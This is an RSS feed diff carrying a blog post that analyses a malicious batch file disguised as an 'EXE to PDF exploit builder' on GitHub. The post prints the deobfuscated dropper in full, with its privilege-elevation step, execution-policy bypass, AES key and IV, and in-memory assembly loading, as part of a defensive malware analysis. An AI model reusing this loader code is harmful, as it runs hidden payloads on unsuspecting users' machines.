@@ -1,19 +1,320 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
   <channel>
     <title>powershell on Connected</title>
     <link>https://ayedaemon.github.io/tags/powershell/</link>
     <description>Recent content in powershell on Connected</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Tue, 30 Aug 2022 17:55:02 +0530</lastBuildDate>
-    <atom:link href="https://ayedaemon.github.io/tags/powershell/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Tue, 30 Aug 2022 17:55:02 +0530</lastBuildDate><atom:link href="https://ayedaemon.github.io/tags/powershell/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>Analyzing Simple Powershell Malware</title>
       <link>https://ayedaemon.github.io/post/2022/08/analyzing-simple-powershell-malware/</link>
       <pubDate>Tue, 30 Aug 2022 17:55:02 +0530</pubDate>
+      
       <guid>https://ayedaemon.github.io/post/2022/08/analyzing-simple-powershell-malware/</guid>
-      <description>What is a malware? Malware, a portmanteu meaning malicious software, refers to any program that was created with the specific goal of doing harm. Your digital environment is vulnerable to a variety of terrible things, including attempts to compromise your computer or network, leak confidential data, and gain illegal access. These issues can occasionally be brought on by common software defects, but when malware is to blame, it poses a major risk to online users and businesses.</description>
+      <description>Story of how I examined some basic powershell malware I happened to stumble into on github.</description>
+      <content:encoded><![CDATA[<h3 id="what-is-a-malware">What is a malware?</h3>
+<p>Malware, a <a href="https://en.wikipedia.org/wiki/Portmanteau">portmanteu</a> meaning malicious software, refers to any program that was created with the specific goal of doing harm.
+Your digital environment is vulnerable to a variety of terrible things, including attempts to compromise your computer or network, leak confidential data, and gain illegal access. These issues can occasionally be brought on by common software defects, but when malware is to blame, it poses a major risk to online users and businesses.</p>
+<p><em>Yes, a virus is a malware</em>.. Malware is an umbrella term, with virus being just one of types among <a href="https://en.wikipedia.org/wiki/Malware#Types">many others</a>.</p>
+<h3 id="common-obfuscation-techniques">Common obfuscation techniques?</h3>
+<p>Obfuscation is a software engineering technique used by hackers and security teams mainly to conceal the written code. There are different motivations to use obfuscation, but their aim is the same – to make the source code unintelligible, difficult to comprehend, and interpret.</p>
+<p>Few of the common obfuscatons techniques involve</p>
+<ul>
+<li>Dead-code insertion</li>
+<li>Code flow obfuscation</li>
+<li>Variable renaming</li>
+<li>String encryption</li>
+<li>etc..</li>
+</ul>
+<h3 id="journey-begins">Journey begins!</h3>
+<p>I always like trying out new tools and understanding how they work behind the scenes. And about time I got my eyes on a <a href="https://github.com/luci61/Exe-to-pdf">github repo that said <strong>EXE TO PDF Exploit Builder</strong></a>.</p>
+<p>This was enough to make me open the repo and look more into it. 😁</p>
+<h4 id="lucifer-on-github">Lucifer on github</h4>
+<p>This repo was owned by <a href="https://github.com/luci61"><code>Luci441</code></a>&hellip; But for some reasons this looked suspecious to me.</p>
+<p><img loading="lazy" src="https://i.imgur.com/KWaUh7B.png#center" alt=""  />
+</p>
+<ol>
+<li>The account is only few days old.</li>
+<li>The owner claims to be the owner of <a href="https://twitter.com/hackforumsnet">Hackforums</a>.</li>
+<li>And it only had 6 followers&hellip;. Hackforum twitter account had 11.2K Followers at the time of writing this blog.</li>
+</ol>
+<p>Anyways, I was more interested into looking how that <strong>EXE to PDF</strong> program worked. So I moved directly to the repo and looked at the source code. The README contained something that made me more suspecious&hellip;</p>
+<p><img loading="lazy" src="https://i.imgur.com/FTFCzTv.png#center" alt=""  />
+</p>
+<p>Why make such a tool obfuscated?? Why no VMs supported?? Who makes such a tool and intentionally make it unusable in VMs?</p>
+<p>And there is no <em>how to get started</em> section with this tool so I&rsquo;ll have to read the code and understand it. Good heavens&hellip; Finally I got started with the <a href="https://github.com/luci61/Exe-to-pdf/blob/main/ExploitBuilder.bat"><code>ExploitBuilder.bat</code></a> file to read the source code.</p>
+<p><em>There are a lot of things that raise doubt, but that&rsquo;s not what why you are here. Are you?</em></p>
+<h4 id="simplifying-initial-payload">Simplifying initial payload</h4>
+<p>After taking a look at all the files inside the repo, it was safe to assume that there was absolutely no need of the C header files (.h files). This was just to make everything a bit more convincing.</p>
+<p>First thing first, I forked the repo and removed all the extra files. The forked repo can be found here -&gt; <a href="https://github.com/ayedaemon/Exe-to-pdf">https://github.com/ayedaemon/Exe-to-pdf</a>. <em>Interestingly, there was a <a href="https://github.com/luci61/Exe-to-pdf/pull/2/commits/9731946651866c7ea8ec5c5cbe654a979b51c55f">Pull Request</a> to the original repo that mentioned about the malware it contained. But I won&rsquo;t talk about it and ruin the journey</em> ;)</p>
+<p>Most interesting file in the whole repo was the batchfile and it was obfuscated. The whole thing was divided into multiple variables and then the complete command was constructed at runtime by concatinating those jumbled strings. <em>I gotta admit there is a lot one can do with strings nowadays.</em></p>
+<p>I cleaned most of the lines with <code>sed</code> and then printed them with <code>python</code>. Maybe there is a faster and better way to clean it.. I&rsquo;ll be happy to hear if you have any alternative ways to do it easily.</p>
+<p>Here is the python notebook that shows the initial deobfuscation. &ndash;&gt; <a href="https://github.com/ayedaemon/Exe-to-pdf/blob/main/notebook.ipynb">https://github.com/ayedaemon/Exe-to-pdf/blob/main/notebook.ipynb</a></p>
+<p>After this, I had the clean payload that was much much easier to read. Here is the clean payload &ndash;&gt; <a href="https://github.com/ayedaemon/Exe-to-pdf/blob/main/clean_payload.txt">https://github.com/ayedaemon/Exe-to-pdf/blob/main/clean_payload.txt</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">@echo off
+</span></span><span class="line"><span class="cl">net file
+</span></span><span class="line"><span class="cl">if not %errorlevel%==0 ( powershell -noprofile -ep bypass -command Start-Process -FilePath &#39;%0&#39; -ArgumentList &#39;%cd%&#39; -Verb runas &amp; exit /b )
+</span></span><span class="line"><span class="cl">cd /d %1
+</span></span><span class="line"><span class="cl">copy C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe /y %~dp0%~nx0.exe&#39;
+</span></span><span class="line"><span class="cl">cls
+</span></span><span class="line"><span class="cl">cd %~dp0
+</span></span><span class="line"><span class="cl">%~nx0.exe -noprofile -windowstyle hidden -ep bypass -command $eaqcw = [System.IO.File]::(&#39;txeTllAdaeR&#39;[-1..-11] -join &#39;&#39;)(&#39;%~f0&#39;).Split([Environment]::NewLine);foreach ($VtoBl in $eaqcw) { if ($VtoBl.StartsWith(&#39;:: &#39;)) {  $BMjJe = $VtoBl.Substring(3); break; }; };$VGGCQ = [System.Convert]::(&#39;gnirtS46esaBmorF&#39;[-1..-16] -join &#39;&#39;)($BMjJe);$hbvqO = New-Object System.Security.Cryptography.AesManaged;$hbvqO.Mode = [System.Security.Cryptography.CipherMode]::CBC;$hbvqO.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;$hbvqO.Key = [System.Convert]::(&#39;gnirtS46esaBmorF&#39;[-1..-16] -join &#39;&#39;)(&#39;wYPqphQqHyVIeW2CaPqkTUCy/0ecJs6agKij7Q3HRY4=&#39;);$hbvqO.IV = [System.Convert]::(&#39;gnirtS46esaBmorF&#39;[-1..-16] -join &#39;&#39;)(&#39;E55hmIoW8UIQx1ajzTvfAA==&#39;);$CfOAS = $hbvqO.CreateDecryptor();$VGGCQ = $CfOAS.TransformFinalBlock($VGGCQ, 0, $VGGCQ.Length);$CfOAS.Dispose();$hbvqO.Dispose();$YVjlv = New-Object System.IO.MemoryStream(, $VGGCQ);$iJFSw = New-Object System.IO.MemoryStream;$uwkaq = New-Object System.IO.Compression.GZipStream($YVjlv, [IO.Compression.CompressionMode]::Decompress);$uwkaq.CopyTo($iJFSw);$uwkaq.Dispose();$YVjlv.Dispose();$iJFSw.Dispose();$VGGCQ = $iJFSw.ToArray();$WtHIs = [System.Reflection.Assembly]::(&#39;daoL&#39;[-1..-4] -join &#39;&#39;)($VGGCQ);$iFZWS = $WtHIs.EntryPoint;$iFZWS.Invoke($null, (, [string[]] (&#39;%*&#39;)))
+</span></span><span class="line"><span class="cl">exit /b
+</span></span></code></pre></div><p>Let&rsquo;s try and understand this script line by line&hellip; just like an interpreter 😉</p>
+<ul>
+<li>
+<p><code>@echo off</code> prevents the prompt and contents of the batch file from being displayed, so that only the output is visible. The <code>@</code> makes the output of the <code>echo off</code> command hidden as well. If you are into bad things or preventing bad things to happen - this is like a defacto starting command for all batch scripts.</p>
+</li>
+<li>
+<p><code>net file</code> without any extra argumnents this displays all the open shared files on a server and the lock-ids (if any). I&rsquo;m not completely sure why this is used but anyways</p>
+</li>
+<li>
+<p>Then it checks <code>errorlevel</code>, it is not <code>0</code> then it&rsquo;ll run some powershell command. I&rsquo;m not very good with windows and it&rsquo;s tools at this point but it is very clear that is executing something with <code>-ep bypass</code> to prevent any warnings or prompts. <em><a href="https://www.urbandictionary.com/define.php?term=sus">Sus</a> it is, isn&rsquo;t it?</em></p>
+</li>
+<li>
+<p>After changing directory (where it can put all his mess, without being sus), it copies the powershell binary and saves it with another name.</p>
+</li>
+<li>
+<p>Clears the screen to remove all the output generated. Above tasks will be in a flash and you probably will just see a blink on terminal if you have <a href="https://duckduckgo.com/?q=Veronica+Seider%27s+Super+Power+wikipedia&amp;ia=web">Veronica Seider’s Super Power</a>. <em>Bad Joke, I know.</em></p>
+</li>
+<li>
+<p>Eventually, it&rsquo;ll use the copied &amp; renamed powershell to run some <strong><code>-command</code></strong> with <code>-ep bypass</code> flag. After a bit of google-fu I got to know about few common techniques used to bypass powershell execution policy. I found <a href="https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/">this blog</a> <sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup> concise and helpful for the same topic.</p>
+</li>
+</ul>
+<h4 id="de-obfuscating-powershell">de-obfuscating powershell</h4>
+<p>I copied the powershell <strong><code>-command</code></strong> to another file, just to make more sense of it. And it looked better than before.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ps1" data-lang="ps1"><span class="line"><span class="cl"><span class="nv">$eaqcw</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.IO.File</span><span class="p">]::(</span><span class="s1">&#39;txeTllAdaeR&#39;</span><span class="p">[</span><span class="mf">-1</span><span class="p">..</span><span class="mf">-11</span><span class="p">]</span> <span class="n">-join</span> <span class="s1">&#39;&#39;</span><span class="p">)(</span><span class="s1">&#39;%~f0&#39;</span><span class="p">).</span><span class="py">Split</span><span class="p">([</span><span class="no">Environment</span><span class="p">]::</span><span class="n">NewLine</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">foreach</span> <span class="p">(</span><span class="nv">$VtoBl</span> <span class="k">in</span> <span class="nv">$eaqcw</span><span class="p">)</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$VtoBl</span><span class="p">.</span><span class="py">StartsWith</span><span class="p">(</span><span class="s1">&#39;:: &#39;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$BMjJe</span> <span class="p">=</span> <span class="nv">$VtoBl</span><span class="p">.</span><span class="py">Substring</span><span class="p">(</span><span class="mf">3</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">};</span> 
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$VGGCQ</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.Convert</span><span class="p">]::(</span><span class="s1">&#39;gnirtS46esaBmorF&#39;</span><span class="p">[</span><span class="mf">-1</span><span class="p">..</span><span class="mf">-16</span><span class="p">]</span> <span class="n">-join</span> <span class="s1">&#39;&#39;</span><span class="p">)(</span><span class="nv">$BMjJe</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$hbvqO</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">Security</span><span class="p">.</span><span class="py">Cryptography</span><span class="p">.</span><span class="n">AesManaged</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$hbvqO</span><span class="p">.</span><span class="py">Mode</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.Security.Cryptography.CipherMode</span><span class="p">]::</span><span class="n">CBC</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$hbvqO</span><span class="p">.</span><span class="py">Padding</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.Security.Cryptography.PaddingMode</span><span class="p">]::</span><span class="n">PKCS7</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$hbvqO</span><span class="p">.</span><span class="py">Key</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.Convert</span><span class="p">]::(</span><span class="s1">&#39;gnirtS46esaBmorF&#39;</span><span class="p">[</span><span class="mf">-1</span><span class="p">..</span><span class="mf">-16</span><span class="p">]</span> <span class="n">-join</span> <span class="s1">&#39;&#39;</span><span class="p">)(</span><span class="s1">&#39;wYPqphQqHyVIeW2CaPqkTUCy/0ecJs6agKij7Q3HRY4=&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$hbvqO</span><span class="p">.</span><span class="py">IV</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.Convert</span><span class="p">]::(</span><span class="s1">&#39;gnirtS46esaBmorF&#39;</span><span class="p">[</span><span class="mf">-1</span><span class="p">..</span><span class="mf">-16</span><span class="p">]</span> <span class="n">-join</span> <span class="s1">&#39;&#39;</span><span class="p">)(</span><span class="s1">&#39;E55hmIoW8UIQx1ajzTvfAA==&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$CfOAS</span> <span class="p">=</span> <span class="nv">$hbvqO</span><span class="p">.</span><span class="py">CreateDecryptor</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$VGGCQ</span> <span class="p">=</span> <span class="nv">$CfOAS</span><span class="p">.</span><span class="py">TransformFinalBlock</span><span class="p">(</span><span class="nv">$VGGCQ</span><span class="p">,</span> <span class="mf">0</span><span class="p">,</span> <span class="nv">$VGGCQ</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$CfOAS</span><span class="p">.</span><span class="py">Dispose</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$hbvqO</span><span class="p">.</span><span class="py">Dispose</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$YVjlv</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">IO</span><span class="p">.</span><span class="py">MemoryStream</span><span class="p">(,</span> <span class="nv">$VGGCQ</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$iJFSw</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">IO</span><span class="p">.</span><span class="n">MemoryStream</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$uwkaq</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">IO</span><span class="p">.</span><span class="py">Compression</span><span class="p">.</span><span class="py">GZipStream</span><span class="p">(</span><span class="nv">$YVjlv</span><span class="p">,</span> <span class="p">[</span><span class="no">IO.Compression.CompressionMode</span><span class="p">]::</span><span class="n">Decompress</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$uwkaq</span><span class="p">.</span><span class="py">CopyTo</span><span class="p">(</span><span class="nv">$iJFSw</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$uwkaq</span><span class="p">.</span><span class="py">Dispose</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$YVjlv</span><span class="p">.</span><span class="py">Dispose</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$iJFSw</span><span class="p">.</span><span class="py">Dispose</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$VGGCQ</span> <span class="p">=</span> <span class="nv">$iJFSw</span><span class="p">.</span><span class="py">ToArray</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$WtHIs</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.Reflection.Assembly</span><span class="p">]::(</span><span class="s1">&#39;daoL&#39;</span><span class="p">[</span><span class="mf">-1</span><span class="p">..</span><span class="mf">-4</span><span class="p">]</span> <span class="n">-join</span> <span class="s1">&#39;&#39;</span><span class="p">)(</span><span class="nv">$VGGCQ</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$iFZWS</span> <span class="p">=</span> <span class="nv">$WtHIs</span><span class="p">.</span><span class="n">EntryPoint</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$iFZWS</span><span class="p">.</span><span class="py">Invoke</span><span class="p">(</span><span class="vm">$null</span><span class="p">,</span> <span class="p">(,</span> <span class="p">[</span><span class="no">string[]</span><span class="p">]</span> <span class="p">(</span><span class="s1">&#39;%*&#39;</span><span class="p">)))</span>
+</span></span></code></pre></div><p>If I did not mention this earlier, I&rsquo;m not good with windows OS and powershell scripting, but with decent knowledge about programming/scripting languages and a text editor of choice, it was not so hard to make this code understandable. De-obfuscated file can be found on github here -&gt; <a href="https://github.com/ayedaemon/Exe-to-pdf/blob/main/powershell_command_deobfuscated.txt">https://github.com/ayedaemon/Exe-to-pdf/blob/main/powershell_command_deobfuscated.txt</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ps1" data-lang="ps1"><span class="line"><span class="cl"><span class="c">## Read the initial payload file</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$payload</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.IO.File</span><span class="p">]::(</span><span class="s1">&#39;txeTllAdaeR&#39;</span><span class="p">[</span><span class="mf">-1</span><span class="p">..</span><span class="mf">-11</span><span class="p">]</span> <span class="n">-join</span> <span class="s1">&#39;&#39;</span><span class="p">)(</span><span class="s1">&#39;/ExploitBuilder.bat&#39;</span><span class="p">).</span><span class="py">Split</span><span class="p">([</span><span class="no">Environment</span><span class="p">]::</span><span class="n">NewLine</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">## Get the line starting with `:: `; This also acts as the comment in batch scripting</span>
+</span></span><span class="line"><span class="cl"><span class="k">foreach</span> <span class="p">(</span><span class="nv">$each_line</span> <span class="k">in</span> <span class="nv">$payload</span><span class="p">)</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$each_line</span><span class="p">.</span><span class="py">StartsWith</span><span class="p">(</span><span class="s1">&#39;:: &#39;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$comment_line</span> <span class="p">=</span> <span class="nv">$each_line</span><span class="p">.</span><span class="py">Substring</span><span class="p">(</span><span class="mf">3</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">};</span> 
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">## Decode the comment line with &#34;Military grade AES encryption&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$decoded_comment_line</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.Convert</span><span class="p">]::(</span><span class="s1">&#39;gnirtS46esaBmorF&#39;</span><span class="p">[</span><span class="mf">-1</span><span class="p">..</span><span class="mf">-16</span><span class="p">]</span> <span class="n">-join</span> <span class="s1">&#39;&#39;</span><span class="p">)(</span><span class="nv">$comment_line</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$cryptObj</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">Security</span><span class="p">.</span><span class="py">Cryptography</span><span class="p">.</span><span class="n">AesManaged</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$cryptObj</span><span class="p">.</span><span class="py">Mode</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.Security.Cryptography.CipherMode</span><span class="p">]::</span><span class="n">CBC</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$cryptObj</span><span class="p">.</span><span class="py">Padding</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.Security.Cryptography.PaddingMode</span><span class="p">]::</span><span class="n">PKCS7</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$cryptObj</span><span class="p">.</span><span class="py">Key</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.Convert</span><span class="p">]::(</span><span class="s1">&#39;gnirtS46esaBmorF&#39;</span><span class="p">[</span><span class="mf">-1</span><span class="p">..</span><span class="mf">-16</span><span class="p">]</span> <span class="n">-join</span> <span class="s1">&#39;&#39;</span><span class="p">)(</span><span class="s1">&#39;wYPqphQqHyVIeW2CaPqkTUCy/0ecJs6agKij7Q3HRY4=&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$cryptObj</span><span class="p">.</span><span class="py">IV</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.Convert</span><span class="p">]::(</span><span class="s1">&#39;gnirtS46esaBmorF&#39;</span><span class="p">[</span><span class="mf">-1</span><span class="p">..</span><span class="mf">-16</span><span class="p">]</span> <span class="n">-join</span> <span class="s1">&#39;&#39;</span><span class="p">)(</span><span class="s1">&#39;E55hmIoW8UIQx1ajzTvfAA==&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$decryptObj</span> <span class="p">=</span> <span class="nv">$cryptObj</span><span class="p">.</span><span class="py">CreateDecryptor</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$decrypted_comment_line</span> <span class="p">=</span> <span class="nv">$decryptObj</span><span class="p">.</span><span class="py">TransformFinalBlock</span><span class="p">(</span><span class="nv">$decoded_comment_line</span><span class="p">,</span> <span class="mf">0</span><span class="p">,</span> <span class="nv">$decoded_comment_line</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$decryptObj</span><span class="p">.</span><span class="py">Dispose</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$cryptObj</span><span class="p">.</span><span class="py">Dispose</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">## Shuffle the data throught memory streams and decompress it (gzip decompression)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$decrypted_stream</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">IO</span><span class="p">.</span><span class="py">MemoryStream</span><span class="p">(,</span> <span class="nv">$decrypted_comment_line</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$extra_stream</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">IO</span><span class="p">.</span><span class="n">MemoryStream</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$ungzip_decrypted_stream</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">IO</span><span class="p">.</span><span class="py">Compression</span><span class="p">.</span><span class="py">GZipStream</span><span class="p">(</span><span class="nv">$decrypted_stream</span><span class="p">,</span> <span class="p">[</span><span class="no">IO.Compression.CompressionMode</span><span class="p">]::</span><span class="n">Decompress</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$ungzip_decrypted_stream</span><span class="p">.</span><span class="py">CopyTo</span><span class="p">(</span><span class="nv">$extra_stream</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$ungzip_decrypted_stream</span><span class="p">.</span><span class="py">Dispose</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$decrypted_stream</span><span class="p">.</span><span class="py">Dispose</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$extra_stream</span><span class="p">.</span><span class="py">Dispose</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">## Load the final binary and execute it</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$asm</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.Reflection.Assembly</span><span class="p">]::(</span><span class="s1">&#39;daoL&#39;</span><span class="p">[</span><span class="mf">-1</span><span class="p">..</span><span class="mf">-4</span><span class="p">]</span> <span class="n">-join</span> <span class="s1">&#39;&#39;</span><span class="p">)(</span><span class="nv">$decrypted_array</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$asm_entrypoint</span> <span class="p">=</span> <span class="nv">$asm</span><span class="p">.</span><span class="n">EntryPoint</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$asm_entrypoint</span><span class="p">.</span><span class="py">Invoke</span><span class="p">(</span><span class="vm">$null</span><span class="p">,</span> <span class="p">(,</span> <span class="p">[</span><span class="no">string[]</span><span class="p">]</span> <span class="p">(</span><span class="s1">&#39;%*&#39;</span><span class="p">)))</span>
+</span></span></code></pre></div><p>There are tons of obfuscation techniques that can be used by a hacker or a professional, but the final goal is common - To make it harder to read and interpret. Here is a <a href="https://www.offensive-security.com/offsec/powershell-obfuscation/">blog by Offensive-Security on powershell obfuscation</a> <sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup> that helped me to gain knowledge about how powershell malwares are usually obfuscated.</p>
+<p>This malware specifically used some good techniques:-</p>
+<ul>
+<li>changing the variable names to random characters</li>
+<li>String reversal techniques for powershell commands.</li>
+<li>Key based cryptography to encrypt the malicious payload.</li>
+<li>Compressing the payload to prevent detection</li>
+<li>Decompressing in memory streams to make it somewhat fileless and hard to detect.</li>
+</ul>
+<p>&hellip;but the method employed to hide the payload in comments actually astounded me.</p>
+<h4 id="windows-exe-file">Windows EXE file</h4>
+<p>There were several steps within a single line powershell command, that were eventually loading and executing the actual malware. Instead of writing my own functions to reverse engineer everything the author has done, I took the lazy approach and let his code do most of the work&hellip;and just before the loading &amp; execution segment, I dumped the binary. 🤭</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ps1" data-lang="ps1"><span class="line"><span class="cl"><span class="c">## Dump exe file before loading and executing</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$result</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.Text.Encoding</span><span class="p">]::</span><span class="n">UTF8</span><span class="p">.</span><span class="py">GetString</span><span class="p">(</span><span class="nv">$extra_stream</span><span class="p">.</span><span class="py">ToArray</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$result</span> <span class="p">&gt;</span> <span class="n">extra_stream</span><span class="p">.</span><span class="py">exe</span><span class="p">.</span><span class="py">txt</span>
+</span></span></code></pre></div><p><em>How I know it is an EXE file? &hellip;Simply by looking at the <a href="https://en.wikipedia.org/wiki/Magic_number_(programming)">magic numbers</a> of the obtained file</em></p>
+<p>All the obfuscation, just to make sure that this <code>exe</code> file gets executed. 🤦 Well, now it&rsquo;s time to analyze the binary file we just extracted and see if we can figure out the truth about this <strong>EXE-to-pdf</strong> program. For this, I quickly launched up <a href="https://rada.re/n/radare2.html"><code>radare2</code></a> <sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup> in another terminal and started analysing the file. <em>Why Radare2?? I prefer stayting in the terminal&hellip;And it is an amazing tool</em> :)</p>
+<p><strong>What does all Reverse Engineering 101 books say??</strong> - grab some basic info about the binary file and dump all strings to support the existing hypothesis and build on it.</p>
+<p>So I did that..</p>
+<p><strong>Basic info</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">file     extra_stream.exe.txt
+</span></span><span class="line"><span class="cl">size     0x409f
+</span></span><span class="line"><span class="cl">humansz  16.2K
+</span></span><span class="line"><span class="cl">minopsz  1
+</span></span><span class="line"><span class="cl">maxopsz  16
+</span></span><span class="line"><span class="cl">invopsz  1
+</span></span><span class="line"><span class="cl">mode     r-x
+</span></span><span class="line"><span class="cl">format   any
+</span></span><span class="line"><span class="cl">iorw     false
+</span></span><span class="line"><span class="cl">block    0x100
+</span></span></code></pre></div><p><strong>Strings (omitted)</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">211 0x0000271a 0x0000271a 20  21           ascii   BJEtuQtQCkWlpTOkRPdJ
+</span></span><span class="line"><span class="cl">212 0x0000272f 0x0000272f 20  21           ascii   OzLDUBlAcSBIOPOJLBlh
+</span></span><span class="line"><span class="cl">213 0x00002744 0x00002744 20  21           ascii   BDltEFgkoicgcKNaARhF
+</span></span><span class="line"><span class="cl">214 0x00002759 0x00002759 20  21           ascii   QvYrospzbuUnUAXNVABe
+</span></span><span class="line"><span class="cl">215 0x0000276e 0x0000276e 20  21           ascii   joIOHkxVlAiZHoYgFUel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">316 0x00002ce8 0x00002ce8 14  15           ascii   RuntimeHelpers
